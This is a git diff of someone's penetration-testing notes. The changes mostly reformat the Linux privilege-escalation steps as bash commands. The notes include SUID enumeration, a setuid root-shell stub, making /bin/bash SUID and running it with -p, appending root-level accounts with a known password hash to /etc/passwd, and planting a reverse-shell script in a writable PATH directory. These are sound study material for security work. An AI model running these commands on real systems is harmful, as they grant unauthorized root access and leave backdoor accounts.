@@ -24,8 +24,8 @@ Notes related to Vuln Assmnt/PenTesting
 
 #### PrivESC Methodology for Linux
 > 1. Creds file or any misconfiguration file? (**find or grep** command)
-> 1. SUDO commands this user can run ? (try running sudo -l) 
-> 1. SUID binaries present (use **find** command or **suid3num python** script)
+> 1. SUDO commands this user can run ? (try running ```bash sudo -l```) 
+> 1. SUID binaries present (use ```bash find / -perm -4000 -ls 2>/dev/null``` command or **suid3num python** script)
 > 1. Is there SQL database, try enumerating it ? Maybe it has linux user password in it ? 
 > 1. Running ports / services on this box ? (use **netstat** or **ss** command)
 > 1. Pspy ?
@@ -65,7 +65,7 @@ setuid(0); setgid(0); system("/bin/bash");
 }
 ```
 #### PrivESC Methodology for Linux - writeable PATH
-> 1. Usually normal $PATH is -> /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+> 1. Usually normal $PATH is -> ```bash /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ```
 > 1. If any of the above is writeable, add your custom script.
 > 1. Check for a cronjob e.g **run-parts** on Ubuntu is present in **/bin** and if **/usr/local/bin** is writeable, we can make our own malicious **REV shell** or **BASH SUID** script in **/usr/local/bin** as **run-parts** and this will do the work. 
 
@@ -77,13 +77,13 @@ setuid(0); setgid(0); system("/bin/bash");
 chmod +s /bin/bash
 ```
 > 1. check the **SUID** bit set on **/bin/bash**.
-> 1. /bin/bash -p (you shoud be **root**).
+> 1. ```bash /bin/bash -p ``` (you shoud be **root**).
 
 #### PrivESC Methodology for Linux - /etc/passwd && /etc/shadow
 > 1. Check who owns -> ls -lart /etc/passwd && who owns ls -lart /etc/shadow. 
 > 1. Making user **fm** the root by typing command ->  echo fm::0:0:root:/root:/bin/bash >> /etc/passwd
 > 1. openssl for generating password hashes command -> openssl passwd -1
-> 1. username:password === skinny1:123 ```echo 'skinny1:$1$UcH1bqbq$q2aTjHzGSqyXJxsE92LRw1:0:0:root:/root:/bin/bash' >> /etc/passwd```
+> 1. username:password === skinny1:123 ```bash echo 'skinny1:$1$UcH1bqbq$q2aTjHzGSqyXJxsE92LRw1:0:0:root:/root:/bin/bash' >> /etc/passwd```
 
 #### Pivoting crap - MSF, socks4a and proxychains
 > 1. use msf exploit/multi/handler
